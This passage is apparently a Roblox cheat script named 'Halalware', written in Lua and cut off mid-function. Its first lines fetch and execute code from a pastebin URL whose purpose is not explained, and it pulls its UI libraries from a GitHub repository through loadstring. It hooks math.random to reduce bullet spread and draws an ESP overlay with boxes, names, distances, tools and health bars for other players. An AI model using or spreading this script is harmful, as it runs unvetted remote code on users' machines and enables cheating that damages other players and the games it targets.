-- 32vision cursed you, what you try to see here?
wait(3);
loadstring(game:HttpGet("https://pastebin.com/raw/gimbTwW1"))();
getgenv().S = {PS=game:GetService("Players"),RS=game:GetService("RunService"),WS=game:GetService("Workspace"),UIS=game:GetService("UserInputService"),TS=game:GetService("TweenService"),LS=game:GetService("Lighting"),CG=game:GetService("CoreGui"),SG=game:GetService("StarterGui"),SP=game:GetService("StarterPack"),SR=game:GetService("StarterPlayer"),RP=game:GetService("ReplicatedStorage"),RF=game:GetService("ReplicatedFirst"),SS=game:GetService("SoundService"),TV=game:GetService("TeleportService"),BS=game:GetService("BadgeService"),PL=game:GetService("PolicyService"),PF=game:GetService("PathfindingService"),DS=game:GetService("DataStoreService"),CH=game:GetService("Chat"),MSG=game:GetService("MessagingService"),FS=game:GetService("FriendService"),INS=game:GetService("InsertService"),TM=game:GetService("Teams"),SGv=game:GetService("StarterGear"),VR=game:GetService("VRService"),GU=game:GetService("GuiService"),TScr=game:GetService("TextService"),DB=game:GetService("Debris"),PH=game:GetService("PhysicsService"),LOC=game:GetService("LocalizationService"),TST=game:GetService("TestService"),VS=game:GetService("VoiceChatService"),NS=game:GetService("NotificationService"),HS=game:GetService("HttpService"),CS=game:GetService("CollectionService"),CP=game:GetService("ContentProvider"),PPS=game:GetService("ProximityPromptService"),TCS=game:GetService("TextChatService"),ES=game:GetService("ExperienceService"),PSS=game:GetService("PointsService"),GS=game:GetService("GroupService"),MS=game:GetService("MarketplaceService")};
local S = getgenv().S;
getgenv().SpreadMod = {BulletSpread={Enabled=false,Amount=0}};
getgenv().old_math_random = hookfunction(math.random, function(...)
	local args = {...};
	if checkcaller() then
		return getgenv().old_math_random(...);
	end
	if ((#args == 0) or ((args[1] == -0.05) and (args[2] == 0.05)) or (args[1] == -0.1) or (args[1] == -0.05)) then
		if getgenv().SpreadMod.BulletSpread.Enabled then
			local spread = getgenv().SpreadMod.BulletSpread.Amount;
			return getgenv().old_math_random(...) * (spread / 100);
		else
			return getgenv().old_math_random(...);
		end
	end
	return getgenv().old_math_random(...);
end);
getgenv().M = {abs=math.abs,floor=math.floor,ceil=math.ceil,sqrt=math.sqrt,clamp=math.clamp,min=math.min,max=math.max,atan2=math.atan2,acos=math.acos,asin=math.asin,cos=math.cos,sin=math.sin,tan=math.tan,rad=math.rad,deg=math.deg,random=math.random};
getgenv().T = {insert=table.insert,remove=table.remove,sort=table.sort,find=table.find,concat=table.concat,clear=table.clear};
getgenv().STR = {sub=string.sub,gsub=string.gsub,lower=string.lower,upper=string.upper,rep=string.rep,split=string.split,fmt=string.format};
local M = getgenv().M;
local T = getgenv().T;
local STR = getgenv().STR;
getgenv().Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/halalware/refs/heads/main/libtest"))();
getgenv().ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/halalware/refs/heads/main/themes"))();
getgenv().SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/halalware/refs/heads/main/savemanager"))();
local repo = getgenv().repo;
local Library = getgenv().Library;
local ThemeManager = getgenv().ThemeManager;
local SaveManager = getgenv().SaveManager;
getgenv().addToggleWithNotify = function(group, id, options)
	local originalCallback = options.Callback;
	options.Callback = function(v)
		originalCallback(v);
		Library:Notify(">_< " .. ((v and "on") or "off"), 3);
	end;
	return group:AddToggle(id, options);
end;
local addToggleWithNotify = getgenv().addToggleWithNotify;
getgenv().G = {lastTracerUpdate=0,tracerUpdateInterval=(1 / 60),ActiveTracers={},TracerCount=0,autoAirDebounce=false,autoAirDebounceTime=0.02,hitEffectDebounce=false,lastDamageTick=0,crosshairLines={},crosshairOutlines={},crosshairAngle=0,crosshairConn=nil,originalPlayerMaxZoom=0,rapidFireM1Firing=false,rapidFireM1Debounce=false,rapidFireM1MinDelay=0,rapidFireM1ConnBegan=nil,rapidFireM1ConnEnded=nil,rapidFireM1CharConn=nil,yawLockerConnection=nil,yawJitterState=1,yawJitterTimer=0,GripSettings={Enabled=false,Position=Vector3.new(0, 0, 0),Rotation=Vector3.new(0, 0, 0)},bulletTpConns={},bulletTpCFOffset=function(origin, target)
	local actualOrigin = origin * CFrame.new(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0);
	return actualOrigin:ToObjectSpace(target):inverse();
end};
local G = getgenv().G;
local V3, V2, CF, C3, U2, RP = Vector3, Vector2, CFrame, Color3, UDim2, RaycastParams;
local RND, SND, HRT = S.RS.RenderStepped, S.RS.Stepped, S.RS.Heartbeat;
local LP = S.PS.LocalPlayer;
local Char = LP.Character or LP.CharacterAdded:Wait();
local Body = {Hum=Char:FindFirstChildOfClass("Humanoid"),HRP=Char:FindFirstChild("HumanoidRootPart"),Head=Char:FindFirstChild("Head"),Tor=(Char:FindFirstChild("Torso") or Char:FindFirstChild("UpperTorso")),LA=(Char:FindFirstChild("Left Arm") or Char:FindFirstChild("LeftUpperArm")),RA=(Char:FindFirstChild("Right Arm") or Char:FindFirstChild("RightUpperArm")),LL=(Char:FindFirstChild("Left Leg") or Char:FindFirstChild("LeftUpperLeg")),RL=(Char:FindFirstChild("Right Leg") or Char:FindFirstChild("RightUpperLeg"))};
local Cam, Mse, Bp, Tm, UID, PGui = S.WS.CurrentCamera, LP:GetMouse(), LP:FindFirstChildOfClass("Backpack"), LP.Team, LP.UserId, LP:FindFirstChildOfClass("PlayerGui");
getgenv().Window = Library:CreateWindow({Title="Halalware",Center=true,AutoShow=true,TabPadding=8,MenuFadeTime=0.2});
local Window = getgenv().Window;
getgenv().Tabs = {Combat=Window:AddTab("Combat"),Misc=Window:AddTab("Misc"),Visuals=Window:AddTab("Visuals"),Player=Window:AddTab("Player"),Config=Window:AddTab("Config")};
local Tabs = getgenv().Tabs;
ThemeManager:SetLibrary(Library);
SaveManager:SetLibrary(Library);
SaveManager:IgnoreThemeSettings();
local MenuGroup = Tabs.Config:AddLeftGroupbox("Menu");
MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {Default="None",NoUI=true,Text="Menu"});
Library.ToggleKeybind = Options.MenuKeybind;
ThemeManager:ApplyToTab(Tabs.Config);
local originalLoadConfig = SaveManager.Load;
SaveManager.Load = function(self, ...)
	originalLoadConfig(self, ...);
	if (BulletTracersConfig and BulletTracersConfig.Enabled and getgenv().setupBulletEffects) then
		task.spawn(function()
			task.wait(0.5);
			getgenv().setupBulletEffects();
		end);
	end
end;
getgenv().updateTargetHUDTheme = function()
	if (not G.TargetHUD or not G.TargetHUD.MainContainer) then
		return;
	end
	G.TargetHUD.MainContainer.BackgroundColor3 = Library.MainColor;
	G.TargetHUD.MainContainer.BorderColor3 = Library.OutlineColor;
	if G.TargetHUD.MainContainer:FindFirstChild("AccentBar") then
		G.TargetHUD.MainContainer.AccentBar.BackgroundColor3 = Library.AccentColor;
	end
	if G.TargetHUD.MainContainer:FindFirstChild("InnerFrame") then
		local gradient = G.TargetHUD.MainContainer.InnerFrame:FindFirstChild("UIGradient");
		if gradient then
			gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Library:GetDarkerColor(Library.MainColor)),ColorSequenceKeypoint.new(1, Library.MainColor)});
		end
	end
	if G.TargetHUD.MainContainer:FindFirstChild("AvatarContainer") then
		G.TargetHUD.MainContainer.AvatarContainer.BackgroundColor3 = Library.MainColor;
		G.TargetHUD.MainContainer.AvatarContainer.BorderColor3 = Library.OutlineColor;
	end
	if G.TargetHUD.MainContainer.InfoContainer:FindFirstChild("UsernameLabel") then
		G.TargetHUD.MainContainer.InfoContainer.UsernameLabel.TextColor3 = Library.FontColor;
	end
	if G.TargetHUD.MainContainer.InfoContainer:FindFirstChild("HealthContainer") then
		G.TargetHUD.MainContainer.InfoContainer.HealthContainer.BackgroundColor3 = Library.BackgroundColor;
		G.TargetHUD.MainContainer.InfoContainer.HealthContainer.BorderColor3 = Library.OutlineColor;
		if G.TargetHUD.MainContainer.InfoContainer.HealthContainer:FindFirstChild("HealthText") then
			G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthText.TextColor3 = Library.FontColor;
		end
		if (G.TargetHUD.MainContainer.InfoContainer.HealthContainer:FindFirstChild("HealthBar") and not G.TargetHUD.CurrentTarget) then
			G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar.BackgroundColor3 = Library.AccentColor;
		end
	end
end;
getgenv().originalThemeUpdate = ThemeManager.ThemeUpdate;
ThemeManager.ThemeUpdate = function(self)
	getgenv().originalThemeUpdate(self);
	getgenv().updateTargetHUDTheme();
end;
SaveManager:BuildConfigSection(Tabs.Config);
SaveManager:LoadAutoloadConfig();
local HUDGroup = Tabs.Config:AddRightGroupbox("HUD");
HUDGroup:AddToggle("ShowWatermark", {Text="WMark",Default=false,Callback=function(v)
	if v then
		local name = (LP and LP.Name) or "Player";
		Library:SetWatermark("halalware.skid | " .. name);
		if (Library.Watermark and Library.Watermark.Parent and Library.Watermark.Parent.DisplayOrder) then
			Library.Watermark.Parent.DisplayOrder = 999999;
		end
	else
		Library:SetWatermark("");
	end
end});
HUDGroup:AddToggle("ShowKeybinds", {Text="Keys",Default=false,Callback=function(v)
	if Library.KeybindFrame then
		Library.KeybindFrame.Visible = v;
	end
end});
getgenv().ESPConfig = {Enabled=false,MaxDistance=200,Box={Enable=false,Type="Full",Font="ProggyClean",Color=Color3.fromRGB(255, 255, 255),Filled={Enable=false,Gradient={Enable=false,Color={Start=Color3.fromRGB(255, 255, 255),End=Color3.fromRGB(255, 255, 255)},Rotation={Enable=false,Auto=true},Transparency=0.3}}},Text={Enable=false,Name={Enable=false,Teamcheck=true,Color=Color3.fromRGB(255, 255, 255)},Studs={Enable=false,Color=Color3.fromRGB(255, 255, 255)},Tool={Enable=false,Color=Color3.fromRGB(255, 255, 255)}},Bars={Enable=false,Health={ShowOutline=false,Enable=false,Lerp=true,Color1=Color3.fromRGB(255, 255, 255)}}};
local ESPGroup = Tabs.Visuals:AddLeftGroupbox(">_<");
addToggleWithNotify(ESPGroup, "ESPEnabled", {Text="ESP",Default=false,Callback=function(v)
	ESPConfig.Enabled = v;
end});
ESPGroup:AddSlider("ESPMaxDist", {Text="MaxDistance",Min=50,Max=10000,Default=ESPConfig.MaxDistance,Rounding=0,Callback=function(v)
	ESPConfig.MaxDistance = v;
end});
ESPGroup:AddToggle("ESPBox", {Text="Box",Default=false,Callback=function(v)
	ESPConfig.Box.Enable = v;
end}):AddColorPicker("ESPBoxColor", {Default=ESPConfig.Box.Color,Callback=function(v)
	ESPConfig.Box.Color = v;
end});
ESPGroup:AddToggle("ESPBoxFilled", {Text="Filled",Default=false,Callback=function(v)
	ESPConfig.Box.Filled.Enable = v;
end}):AddColorPicker("ESPBoxGradStart", {Default=ESPConfig.Box.Filled.Gradient.Color.Start,Callback=function(v)
	ESPConfig.Box.Filled.Gradient.Color.Start = v;
end}):AddColorPicker("ESPBoxGradEnd", {Default=ESPConfig.Box.Filled.Gradient.Color.End,Callback=function(v)
	ESPConfig.Box.Filled.Gradient.Color.End = v;
end});
ESPGroup:AddToggle("ESPBoxGradient", {Text="GradAnim",Default=false,Callback=function(v)
	ESPConfig.Box.Filled.Gradient.Enable = v;
end});
ESPGroup:AddSlider("ESPBoxGradTrans", {Text="GradTrans",Min=0,Max=1,Default=ESPConfig.Box.Filled.Gradient.Transparency,Rounding=2,Callback=function(v)
	ESPConfig.Box.Filled.Gradient.Transparency = v;
end});
ESPGroup:AddToggle("ESPText", {Text="Text",Default=false,Callback=function(v)
	ESPConfig.Text.Enable = v;
end});
ESPGroup:AddToggle("ESPName", {Text="Name",Default=false,Callback=function(v)
	ESPConfig.Text.Name.Enable = v;
end}):AddColorPicker("ESPNameColor", {Default=ESPConfig.Text.Name.Color,Callback=function(v)
	ESPConfig.Text.Name.Color = v;
end});
ESPGroup:AddToggle("ESPStuds", {Text="Studs",Default=false,Callback=function(v)
	ESPConfig.Text.Studs.Enable = v;
end}):AddColorPicker("ESPStudsColor", {Default=ESPConfig.Text.Studs.Color,Callback=function(v)
	ESPConfig.Text.Studs.Color = v;
end});
ESPGroup:AddToggle("ESPTool", {Text="Tool",Default=false,Callback=function(v)
	ESPConfig.Text.Tool.Enable = v;
end}):AddColorPicker("ESPToolColor", {Default=ESPConfig.Text.Tool.Color,Callback=function(v)
	ESPConfig.Text.Tool.Color = v;
end});
ESPGroup:AddToggle("ESPHealthbar", {Text="Healthbar",Default=false,Callback=function(v)
	ESPConfig.Bars.Health.Enable = v;
end}):AddColorPicker("ESPHealthbarColor", {Default=ESPConfig.Bars.Health.Color1,Callback=function(v)
	ESPConfig.Bars.Health.Color1 = v;
end});
local BulletTracersGroup = Tabs.Visuals:AddRightGroupbox(">_<");
getgenv().BulletTracersConfig = {Enabled=false,Color1=C3.new(1, 1, 1),Color2=C3.new(1, 1, 1),Thickness=1,Texture="rbxassetid://446111271"};
local BulletTracersConfig = getgenv().BulletTracersConfig;
local BulletTextures = {Starhook="rbxassetid://446111271",Chain="rbxassetid://3029306948",Lightning="rbxassetid://7216850022",Beam="rbxassetid://1263079249"};
local BulletToggle = addToggleWithNotify(BulletTracersGroup, "BulletTracersEnabled", {Text="Tracer",Default=false,Callback=function(v)
	BulletTracersConfig.Enabled = v;
	if (v and getgenv().setupBulletEffects) then
		getgenv().setupBulletEffects();
	end
end});
BulletToggle:AddColorPicker("BulletTracersColor1", {Default=Color3.fromRGB(255, 255, 255),Title="C1",Callback=function(val)
	BulletTracersConfig.Color1 = val;
end});
BulletToggle:AddColorPicker("BulletTracersColor2", {Default=Color3.fromRGB(255, 255, 255),Title="C2",Callback=function(val)
	BulletTracersConfig.Color2 = val;
end});
BulletTracersGroup:AddSlider("BulletTracersThickness", {Text="Thick",Default=BulletTracersConfig.Thickness,Min=0.1,Max=10,Rounding=1,Callback=function(val)
	BulletTracersConfig.Thickness = val;
end});
BulletTracersGroup:AddDropdown("BulletTracersTexture", {Text="Tex",Values={"Starhook","Chain","Lightning","Beam"},Default="Starhook",Callback=function(val)
	BulletTracersConfig.Texture = BulletTextures[val];
	if (BulletTracersConfig.Enabled and getgenv().setupBulletEffects) then
		getgenv().setupBulletEffects();
	end
end});
local gunState = {current_tool=nil,previous_ammo=0,recently_shot=false,connections={}};
local function detectGame()
	local placeId = game.PlaceId;
	local gameData = {[2788229376]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored.Siren.Radius"},[71189885129233]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored"},[5602055394]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored"},[17403265390]={BN="Part",BBN="gb",BP=""},[17403166075]={BN="Part",BBN="gb",BP=""},[18111448661]={BN="Part",BBN="gb",BP=""},[15186202290]={BN="Part",BBN="gb",BP=""},[11143225577]={BN="BULLET_RAYS",BBN="GunBeam",BP=""},[15763494605]={BN="BULLET_RAYS",BBN="GunBeam",BP=""},[15166543806]={BN="BULLET_RAYS",BBN="GunBeam",BP=""},[17897702920]={BN="BULLET_RAYS",BBN="GunBeam",BP=""},[16033173781]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored.Siren.Radius"},[7213786345]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored.Siren.Radius"},[9825515356]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored"},[16859411452]={BN="bulletray",BBN="beam",BP="Ignored"},[14277620939]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored"},[0]={BN="BULLET_RAYS",BBN="GunBeam",BP="Ignored"}};
	local data = gameData[placeId] or gameData[0];
	return data;
end
local function getPath(root, path)
	if (path == "") then
		return root;
	end
	local parts = STR.split(path, ".");
	local current = root;
	for _, part in ipairs(parts) do
		current = current:FindFirstChild(part);
		if not current then
			return nil;
		end
	end
	return current;
end
local function createBeam(from, to, color1, color2, thickness, texture)
	local mainPart = Instance.new("Part");
	mainPart.Name = "BulletTracer";
	mainPart.Parent = S.WS;
	mainPart.Size = V3.new(0, 0, 0);
	mainPart.Massless = true;
	mainPart.Transparency = 1;
	mainPart.CanCollide = false;
	mainPart.Position = from;
	mainPart.Anchored = true;
	local part0 = Instance.new("Part");
	part0.Parent = mainPart;
	part0.Size = V3.new(0, 0, 0);
	part0.Massless = true;
	part0.Transparency = 1;
	part0.CanCollide = false;
	part0.Position = from;
	part0.Anchored = true;
	local part1 = Instance.new("Part");
	part1.Parent = mainPart;
	part1.Size = V3.new(0, 0, 0);
	part1.Massless = true;
	part1.Transparency = 1;
	part1.CanCollide = false;
	part1.Position = to;
	part1.Anchored = true;
	local attachment0 = Instance.new("Attachment");
	attachment0.Parent = part0;
	local attachment1 = Instance.new("Attachment");
	attachment1.Parent = part1;
	local beam = Instance.new("Beam");
	beam.Texture = texture;
	beam.TextureMode = Enum.TextureMode.Wrap;
	beam.TextureLength = 10;
	beam.LightEmission = 1;
	beam.LightInfluence = 1;
	beam.FaceCamera = true;
	beam.ZOffset = -1;
	beam.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0),NumberSequenceKeypoint.new(1, 1)});
	beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color1),ColorSequenceKeypoint.new(1, color2)});
	beam.Attachment0 = attachment0;
	beam.Attachment1 = attachment1;
	beam.Width0 = thickness;
	beam.Width1 = thickness;
	beam.Enabled = true;
	beam.Parent = mainPart;
	task.delay(0.4, function()
		mainPart:Destroy();
	end);
end
local function getGun(player)
	if (not player or not player.Character) then
		return nil;
	end
	local tool = player.Character:FindFirstChildWhichIsA("Tool");
	if not tool then
		return nil;
	end
	local gunInfo = {};
	local descendants = tool:GetDescendants();
	for _, obj in ipairs(descendants) do
		if (STR.lower(obj.Name):find("ammo") and not STR.lower(obj.Name):find("max") and ((obj.ClassName == "IntValue") or (obj.ClassName == "NumberValue"))) then
			gunInfo.ammo = obj;
			gunInfo.tool = tool;
			return gunInfo;
		end
	end
	return nil;
end
local function setupGunTracking(player)
	for _, connection in ipairs(gunState.connections) do
		if connection then
			connection:Disconnect();
		end
	end
	gunState.connections = {};
	if not player.Character then
		table.insert(gunState.connections, player.CharacterAdded:Connect(function(character)
			setupGunTracking(player);
		end));
		return;
	end
	table.insert(gunState.connections, player.Character.ChildAdded:Connect(function(child)
		if child:IsA("Tool") then
			local gun = getGun(player);
			if gun then
				gunState.current_tool = gun.tool;
				gunState.previous_ammo = gun.ammo.Value;
				table.insert(gunState.connections, gun.ammo.Changed:Connect(function()
					local new_ammo = gun.ammo.Value;
					if (new_ammo < gunState.previous_ammo) then
						gunState.recently_shot = true;
						task.wait();
						gunState.recently_shot = false;
					end
					gunState.previous_ammo = new_ammo;
				end));
			end
		end
	end));
	table.insert(gunState.connections, player.Character.ChildRemoved:Connect(function(child)
		if (child == gunState.current_tool) then
			gunState.current_tool = nil;
			gunState.previous_ammo = 0;
		end
	end));
	local gun = getGun(player);
	if gun then
		gunState.current_tool = gun.tool;
		gunState.previous_ammo = gun.ammo.Value;
		table.insert(gunState.connections, gun.ammo.Changed:Connect(function()
			local new_ammo = gun.ammo.Value;
			if (new_ammo < gunState.previous_ammo) then
				gunState.recently_shot = true;
				task.wait();
				gunState.recently_shot = false;
			end
			gunState.previous_ammo = new_ammo;
		end));
	end
end
local function setupBulletEffects()
	local gameData = detectGame();
	local bulletPath = getPath(S.WS, gameData.BP) or S.WS;
	setupGunTracking(LP);
	if not LP.Character then
		LP.CharacterAdded:Connect(function(character)
			setupGunTracking(LP);
		end);
	end
	if getgenv().bulletTracerConnection then
		getgenv().bulletTracerConnection:Disconnect();
		getgenv().bulletTracerConnection = nil;
	end
	getgenv().bulletTracerConnection = bulletPath.ChildAdded:Connect(function(object)
		if not BulletTracersConfig.Enabled then
			return;
		end
		if (object.Name == gameData.BN) then
			task.spawn(function()
				local gunBeam = object:WaitForChild(gameData.BBN, 0.2);
				if not gunBeam then
					return;
				end
				local startPos = object.Position;
				local endPos = gunBeam.Attachment1.WorldPosition;
				gunBeam:Destroy();
				createBeam(startPos, endPos, BulletTracersConfig.Color1, BulletTracersConfig.Color2, BulletTracersConfig.Thickness, BulletTracersConfig.Texture);
			end);
		end
	end);
	if getgenv().bulletTracerBackupConnection then
		getgenv().bulletTracerBackupConnection:Disconnect();
		getgenv().bulletTracerBackupConnection = nil;
	end
	getgenv().bulletTracerBackupConnection = HRT:Connect(function()
		if not BulletTracersConfig.Enabled then
			return;
		end
		for _, object in ipairs(bulletPath:GetChildren()) do
			if ((object.Name == gameData.BN) and object:IsA("BasePart")) then
				local gunBeam = object:FindFirstChild(gameData.BBN);
				if (gunBeam and not gunBeam:GetAttribute("Processed")) then
					gunBeam:SetAttribute("Processed", true);
					task.spawn(function()
						local startPos = object.Position;
						local endPos = gunBeam.Attachment1.WorldPosition;
						gunBeam:Destroy();
						createBeam(startPos, endPos, BulletTracersConfig.Color1, BulletTracersConfig.Color2, BulletTracersConfig.Thickness, BulletTracersConfig.Texture);
					end);
				end
			end
		end
	end);
end
getgenv().setupBulletEffects = setupBulletEffects;
setupBulletEffects();
getgenv().ESPCache = {};
getgenv().ESPConnections = {};
local ESPCache = getgenv().ESPCache;
local ESPConnections = getgenv().ESPConnections;
local gui_inset = S.GU:GetGuiInset();
getgenv().make_text = function(parent, font)
	local d = Instance.new("TextLabel");
	d.Parent = parent;
	d.Size = U2.new(0, 4, 0, 4);
	d.BackgroundTransparency = 1;
	d.TextColor3 = Color3.fromRGB(255, 255, 255);
	d.TextStrokeTransparency = 0;
	d.TextScaled = false;
	d.TextSize = 10;
	d.TextStrokeColor3 = Color3.fromRGB(0, 0, 0);
	d.Font = font or Enum.Font.SourceSans;
	return d;
end;
local make_text = getgenv().make_text;
getgenv().clear_esp = function(player)
	local cache = ESPCache[player];
	if not cache then
		return;
	end
	if (cache.Box and cache.Box.Full) then
		cache.Box.Full.Square.Visible = false;
		cache.Box.Full.Outline.Visible = false;
		cache.Box.Full.Inline.Visible = false;
		if cache.Box.Full.Filled then
			cache.Box.Full.Filled.Visible = false;
		end
	end
	if cache.Text then
		if cache.Text.Studs then
			cache.Text.Studs.Visible = false;
		end
		if cache.Text.Tool then
			cache.Text.Tool.Visible = false;
		end
		if cache.Text.Name then
			cache.Text.Name.Visible = false;
		end
	end
	if cache.Bars then
		if (cache.Bars.Health and cache.Bars.Health.Frame) then
			cache.Bars.Health.Frame.Visible = false;
			cache.Bars.Health.Outline.Visible = false;
		end
	end
end;
local clear_esp = getgenv().clear_esp;
getgenv().render_esp = function(player)
	if not player then
		return;
	end
	ESPCache[player] = ESPCache[player] or {};
	local cache = ESPCache[player];
	cache.Box = cache.Box or {};
	cache.Bars = cache.Bars or {};
	cache.Text = cache.Text or {};
	cache.Box.Full = cache.Box.Full or {Square=Drawing.new("Square"),Inline=Drawing.new("Square"),Outline=Drawing.new("Square"),Filled=Instance.new("Frame", Instance.new("ScreenGui", S.CG))};
	local Studs = Instance.new("ScreenGui");
	Studs.Parent = S.CG;
	local Name = Instance.new("ScreenGui");
	Name.Parent = S.CG;
	local Tool = Instance.new("ScreenGui");
	Tool.Parent = S.CG;
	cache.Text.Studs = make_text(Studs);
	cache.Text.Tool = make_text(Tool);
	cache.Text.Name = make_text(Name);
	local healthGui = Instance.new("ScreenGui");
	healthGui.Name = player.Name .. "_HealthBar";
	healthGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	healthGui.Parent = S.CG;
	local healthOutline = Instance.new("Frame");
	healthOutline.BackgroundColor3 = Color3.new(0, 0, 0);
	healthOutline.BorderSizePixel = 0;
	healthOutline.Name = "Outline";
	healthOutline.Parent = healthGui;
	local healthFill = Instance.new("Frame");
	healthFill.BackgroundTransparency = 0;
	healthFill.BorderSizePixel = 0;
	healthFill.Name = "Fill";
	healthFill.Parent = healthOutline;
	healthFill.BackgroundColor3 = ESPConfig.Bars.Health.Color1;
	cache.Bars.Health = {Gui=healthGui,Outline=healthOutline,Frame=healthFill};
end;
local render_esp = getgenv().render_esp;
getgenv().update_esp = function(player)
	if (not player or not ESPCache[player]) then
		return;
	end
	local character = player.Character;
	if (not character or not LP.Character) then
		return;
	end
	local rootPart = character:FindFirstChild("HumanoidRootPart");
	local client_root_part = LP.Character:FindFirstChild("HumanoidRootPart");
	local humanoid = character:FindFirstChildWhichIsA("Humanoid");
	if (not rootPart or not humanoid or not client_root_part) then
		clear_esp(player);
		return;
	end
	if (((client_root_part.Position - rootPart.Position).Magnitude > ESPConfig.MaxDistance) or not ESPConfig.Enabled) then
		clear_esp(player);
		return;
	end
	local hrp2D, onScreen = S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position);
	local charSize = (S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position - V3.new(0, 1, 0)).Y - S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position + V3.new(0, 3, 0)).Y) / 2;
	local size = V2.new(M.floor(charSize * 1.5), M.floor(charSize * 3.2));
	local position = V2.new(M.floor(hrp2D.X - ((charSize * 1.5) / 2)), M.floor(hrp2D.Y - ((charSize * 3) / 2)));
	local cache = ESPCache[player];
	if not onScreen then
		clear_esp(player);
		return;
	end
	if ESPConfig.Box.Enable then
		if (ESPConfig.Box.Type == "Full") then
			cache.Box.Full.Square.Visible = true;
			cache.Box.Full.Square.Position = position;
			cache.Box.Full.Square.Size = size;
			cache.Box.Full.Square.Color = ESPConfig.Box.Color;
			cache.Box.Full.Square.Thickness = 2;
			cache.Box.Full.Square.Filled = false;
			cache.Box.Full.Square.ZIndex = 8999999488;
			cache.Box.Full.Outline.Visible = true;
			cache.Box.Full.Outline.Position = position - V2.new(1, 1);
			cache.Box.Full.Outline.Size = size + V2.new(2, 2);
			cache.Box.Full.Outline.Color = Color3.new(0, 0, 0);
			cache.Box.Full.Outline.Thickness = 1;
			cache.Box.Full.Inline.Visible = true;
			cache.Box.Full.Inline.Position = position + V2.new(1, 1);
			cache.Box.Full.Inline.Size = size - V2.new(2, 2);
			cache.Box.Full.Inline.Color = Color3.new(0, 0, 0);
			cache.Box.Full.Inline.Thickness = 1;
			cache.Box.Full.Inline.Filled = false;
			if (ESPConfig.Box.Filled.Enable and cache.Box.Full.Filled) then
				cache.Box.Full.Filled.Position = U2.new(0, position.X, 0, position.Y - S.GU:GetGuiInset().Y);
				cache.Box.Full.Filled.Size = U2.new(0, size.X, 0, size.Y);
				cache.Box.Full.Filled.BackgroundTransparency = ESPConfig.Box.Filled.Gradient.Transparency or 0.5;
				cache.Box.Full.Filled.BackgroundColor3 = Color3.new(1, 1, 1);
				cache.Box.Full.Filled.Visible = true;
				cache.Box.Full.Filled.ZIndex = -8999999488;
				local gradient = cache.Box.Full.Filled:FindFirstChild("Gradient") or Instance.new("UIGradient");
				gradient.Name = "Gradient";
				gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, ESPConfig.Box.Filled.Gradient.Color.Start),ColorSequenceKeypoint.new(1, ESPConfig.Box.Filled.Gradient.Color.End)});
				if ESPConfig.Box.Filled.Gradient.Enable then
					gradient.Rotation = M.sin(tick() * 2) * 180;
				else
					gradient.Rotation = 0;
				end
				if not gradient.Parent then
					gradient.Parent = cache.Box.Full.Filled;
				end
			elseif cache.Box.Full.Filled then
				cache.Box.Full.Filled.Visible = false;
			end
		else
			cache.Box.Full.Square.Visible = false;
			cache.Box.Full.Outline.Visible = false;
			cache.Box.Full.Inline.Visible = false;
			if cache.Box.Full.Filled then
				cache.Box.Full.Filled.Visible = false;
			end
		end
	else
		cache.Box.Full.Square.Visible = false;
		cache.Box.Full.Outline.Visible = false;
		cache.Box.Full.Inline.Visible = false;
		if cache.Box.Full.Filled then
			cache.Box.Full.Filled.Visible = false;
		end
	end
	if (ESPConfig.Bars.Health.Enable and humanoid) then
		local targetHealth = M.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1);
		local lastHealth = cache.Bars.Health.LastHealth or targetHealth;
		local lerpedHealth = lastHealth + ((targetHealth - lastHealth) * 0.05);
		cache.Bars.Health.LastHealth = lerpedHealth;
		local x = position.X - 7;
		if (cache.Bars.Health.Outline and cache.Bars.Health.Frame) then
			cache.Bars.Health.Outline.Visible = true;
			cache.Bars.Health.Outline.Position = U2.new(0, x - 1, 0, (position.Y - S.GU:GetGuiInset().Y) - 1);
			cache.Bars.Health.Outline.Size = U2.new(0, 5, 0, size.Y + 1.1);
			cache.Bars.Health.Outline.BackgroundTransparency = 0.2;
			cache.Bars.Health.Frame.Visible = true;
			cache.Bars.Health.Frame.Position = U2.new(0, 1, 0, ((1 - lerpedHealth) * size.Y) + 1);
			cache.Bars.Health.Frame.Size = U2.new(0, 3, 0, lerpedHealth * size.Y);
			cache.Bars.Health.Frame.BackgroundColor3 = ESPConfig.Bars.Health.Color1;
		end
	else
		if cache.Bars.Health.Outline then
			cache.Bars.Health.Outline.Visible = false;
		end
		if cache.Bars.Health.Frame then
			cache.Bars.Health.Frame.Visible = false;
		end
	end
	if ESPConfig.Text.Enable then
		if cache.Text.Name then
			cache.Text.Name.Visible = ESPConfig.Text.Name.Enable;
			if ESPConfig.Text.Name.Enable then
				cache.Text.Name.Position = U2.new(0, (position.X + (size.X / 2)) - (cache.Text.Name.AbsoluteSize.X / 2), 0, (position.Y - S.GU:GetGuiInset().Y) - 9);
				cache.Text.Name.Text = player.Name;
				cache.Text.Name.TextColor3 = ESPConfig.Text.Name.Color;
			end
		end
		if cache.Text.Tool then
			cache.Text.Tool.Visible = ESPConfig.Text.Tool.Enable;
			if ESPConfig.Text.Tool.Enable then
				cache.Text.Tool.Position = U2.new(0, (position.X + (size.X / 2)) - (cache.Text.Tool.AbsoluteSize.X / 2), 0, (position.Y - S.GU:GetGuiInset().Y) + size.Y + 15);
				local tool = character:FindFirstChildOfClass("Tool");
